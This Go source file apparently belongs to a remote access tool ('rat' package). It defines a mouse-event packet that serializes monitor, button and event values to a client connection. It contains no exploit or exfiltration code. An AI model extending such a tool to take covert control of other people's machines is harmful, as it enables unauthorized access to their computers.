package main

import "rat/common"

type MousePacket struct {
	Monitor, Button, Event int
}

func (packet MousePacket) GetHeader() common.PacketHeader {
	return common.MouseHeader
}

func (packet MousePacket) Write(c *Client) error {
	c.WriteInt(packet.Monitor)
	c.WriteInt(packet.Button)
	return c.WriteInt(packet.Event)
}

func (packet MousePacket) Read(c *Client) error {
	return nil
}
